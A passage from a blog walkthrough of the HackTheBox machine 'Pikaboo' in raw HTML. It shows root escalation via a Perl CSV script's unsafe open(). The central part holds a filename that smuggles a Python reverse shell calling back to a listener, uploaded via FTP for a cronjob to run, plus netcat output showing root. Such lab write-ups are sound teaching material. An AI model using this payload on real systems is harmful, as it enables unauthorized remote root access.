<span class="nb">open</span><span class="p">(</span><span class="k">my</span> <span class="nv">$fh</span><span class="p">,</span> <span class="p">"</span><span class="s2">&gt;&gt;</span><span class="p">",</span> <span class="nv">$fname</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">die</span> <span class="p">"</span><span class="s2">Unable to open CSV target file.</span><span class="se">\n</span><span class="p">";</span>             
                                         
<span class="nb">shift</span><span class="p">;</span>                                                                             
<span class="k">for</span><span class="p">(</span><span class="o">&lt;&gt;</span><span class="p">)</span>                                                                            
<span class="p">{</span>                                                                                  
  <span class="nb">chomp</span><span class="p">;</span>                                                                                                                                                              
  <span class="k">if</span><span class="p">(</span><span class="nv">$csv</span><span class="o">-&gt;</span><span class="nv">parse</span><span class="p">(</span><span class="vg">$_</span><span class="p">))</span>                                                              
  <span class="p">{</span>                                      
    <span class="k">my</span> <span class="nv">@fields</span> <span class="o">=</span> <span class="nv">$csv</span><span class="o">-&gt;</span><span class="nv">fields</span><span class="p">();</span>                                                   
    <span class="k">if</span><span class="p">(</span><span class="nv">@fields</span> <span class="o">!=</span> <span class="nv">$csv_fields</span><span class="p">{</span><span class="nv">$type</span><span class="p">})</span>
    <span class="p">{</span>                                                                              
      <span class="nb">warn</span> <span class="p">"</span><span class="s2">Incorrect number of fields: '</span><span class="si">$_</span><span class="s2">'</span><span class="se">\n</span><span class="p">";</span>                                   
      <span class="k">next</span><span class="p">;</span>                                                                        
    <span class="p">}</span>                                                                              
    <span class="k">print</span> <span class="nv">$fh</span> <span class="p">"</span><span class="si">$_</span><span class="se">\n</span><span class="p">";</span>                                                              
  <span class="p">}</span>                                                                                
<span class="p">}</span>                                                                                  
                                                                                   
<span class="nb">close</span><span class="p">(</span><span class="nv">$fh</span><span class="p">);</span>     
</pre></td></tr></tbody></table></code></div></div>

<p>It;s a perl script which checks for csv fields and does some checks. But we have a function being called <code class="language-plaintext highlighter-rouge">open</code> which can be exploited if more arguments are passed.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719212536.png" alt="[Pasted image 20210719212536.png]" />
Reference:  https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543</p>

<p>So yes it possible to send a shell command and create a file inside the some directory with pwnmeow user through ftp which can be picked up by the cronjob and execute the command</p>

<p>Payload : 
I am using a python reverse shell code, we can use any reverse shell code.</p>
<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">touch</span> <span class="s2">"|python3 -c 'import os,pty,socket;s=socket.socket();s.connect((</span><span class="se">\"</span><span class="s2">10.10.14.132</span><span class="se">\"</span><span class="s2">,9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(</span><span class="se">\"</span><span class="s2">sh</span><span class="se">\"</span><span class="s2">)';echo .csv"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Let’s create this file locally and then upload it through ftp.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719213254.png" alt="[Pasted image 20210719213254.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719213424.png" alt="[Pasted image 20210719213424.png]" /></p>

<p>let’s start a listener and wait for the connection as the cronjob runs every minute</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>root@kali:~/ctf/htb/Pikaboo# nc <span class="nt">-lvp</span> 9001
listening on <span class="o">[</span>any] 9001 ...
connect to <span class="o">[</span>10.10.14.132] from pikaboo <span class="o">[</span>10.129.142.104] 53150
<span class="c"># whoami</span>
<span class="nb">whoami
</span>root
<span class="c"># </span>
</pre></td></tr></tbody></table></code></div></div>

<p>Now we are ROOOOOTT!!!!</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719213543.png" alt="[Pasted image 20210719213543.png]" /></p>

<p>And we the flag.</p>

<p>A very good (HARD) box, but lot of concepts to learn.</p>

<h3 id="learning-is-never-ending-process">Learning is never ending process</h3>



      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        

        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/hackthebox/'>hackthebox</a>,
            <a href='/categories/linux/'>linux</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/hackthebox/"
            class="post-tag no-text-decoration" >hackthebox</a>
          
          <a href="/tags/hard/"
            class="post-tag no-text-decoration" >hard</a>
          
          <a href="/tags/ldap/"
            class="post-tag no-text-decoration" >ldap</a>
          
          <a href="/tags/perl/"
            class="post-tag no-text-decoration" >perl</a>
          
          <a href="/tags/apache/"
            class="post-tag no-text-decoration" >apache</a>
          
          <a href="/tags/nginx/"
            class="post-tag no-text-decoration" >nginx</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          <div class="license-wrapper">
          
            
            This post is licensed under 
            <a href="https://creativecommons.org/licenses/by/4.0/">
              CC BY 4.0
            </a>
             by the author.
          
          </div>

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Pikaboo HTB - tinyb0y&url=http://0.0.0.0:4000/posts/Pikaboo/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Pikaboo HTB - tinyb0y&u=http://0.0.0.0:4000/posts/Pikaboo/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Pikaboo HTB - tinyb0y&url=http://0.0.0.0:4000/posts/Pikaboo/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')"
        data-toggle="tooltip" data-placement="top"
        title="Copy link">
    </i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->





<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag" href="/tags/active-directory/">active directory</a>
      
        
        <a class="post-tag" href="/tags/easy/">easy</a>
      
        
        <a class="post-tag" href="/tags/hacks/">hacks</a>
      
        
        <a class="post-tag" href="/tags/hard/">hard</a>
      
        
        <a class="post-tag" href="/tags/linux/">linux</a>
      
        
        <a class="post-tag" href="/tags/ldap/">ldap</a>
      
        
        <a class="post-tag" href="/tags/tryhackme/">tryhackme</a>
      
        
        <a class="post-tag" href="/tags/windows/">windows</a>
      
        
        <a class="post-tag" href="/tags/bloodhound/">bloodhound</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/Developer/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Jan 15<i class="unloaded">2022-01-15T05:30:00+05:30</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Developer HTB</h3>
            <div class="text-muted small">
              <p>
                





                

A tricky machine where we had to phish the administrator to obtain the credentials using tabnabbing technique. Next exploiting sentry application to execute command injection. Third Stage is to r...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/Intelligence/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Dec  4, 2021<i class="unloaded">2021-12-04T05:30:00+05:30</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Intelligence HTB</h3>
            <div class="text-muted small">
              <p>
                





                Nmap Scan
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/Breadcrumbs/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Jul 13, 2021<i class="unloaded">2021-07-13T05:30:00+05:30</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Breadcrumbs HTB</h3>
            <div class="text-muted small">
              <p>
                





                Nmap
# Nmap done at Tue Jul 13 04:06:21 2021 -- 1 IP address (1 host up) scanned in 49.05 seconds
root@kali:~/ctf/htb/Breadcrumbs/10.129.163.3/nmap# 
root@kali:~/ctf/htb/Breadcrumbs/10.129.163.3/nm...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/Intelligence/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Intelligence HTB</p>
  </a>
  

  
  <a href="/posts/Writer/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Writer HTB</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/t1nyb0y">tinyb0y</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
         theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag" href="/tags/active-directory/">active directory</a>
      
        
        <a class="post-tag" href="/tags/easy/">easy</a>
      
        
        <a class="post-tag" href="/tags/hacks/">hacks</a>
      
        
        <a class="post-tag" href="/tags/hard/">hard</a>
      
        
        <a class="post-tag" href="/tags/linux/">linux</a>
      
        
        <a class="post-tag" href="/tags/ldap/">ldap</a>
      
        
        <a class="post-tag" href="/tags/tryhackme/">tryhackme</a>
      
        
        <a class="post-tag" href="/tags/windows/">windows</a>
      
        
        <a class="post-tag" href="/tags/bloodhound/">bloodhound</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    
      <!--
  mermaid-js loader
-->

<script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script>
<script>
  $(function() {
    let initTheme = "default";

    if ($("html[mode=dark]").length > 0
      || ($("html[mode]").length == 0
        && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) {
      initTheme = "dark";
    }

    let mermaidConf = {
      theme: initTheme  /* <default|dark|forest|neutral> */
    };

    /* Markdown converts to HTML */
    $("pre").has("code.language-mermaid").each(function() {
      let svgCode = $(this).children().html();
      $(this).addClass("unloaded");
      $(this).after(`<div class=\"mermaid\">${svgCode}</div>`);
    });

    mermaid.initialize(mermaidConf);
  });
</script>

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://0.0.0.0:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup -->
  <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script>
  /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
  MathJax = {
    tex: {
      inlineMath: [              /* start/end delimiter pairs for in-line math */
        ['$','$'],
        ['\\(','\\)']
      ],
      displayMath: [             /* start/end delimiter pairs for display math */
        ['$$', '$$'],
        ['\\[', '\\]']
      ]
    }
  };
  </script>
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script type="text/javascript" id="MathJax-script" async
    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
  </script>


<!-- commons -->

<script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>




  </body>

</html>

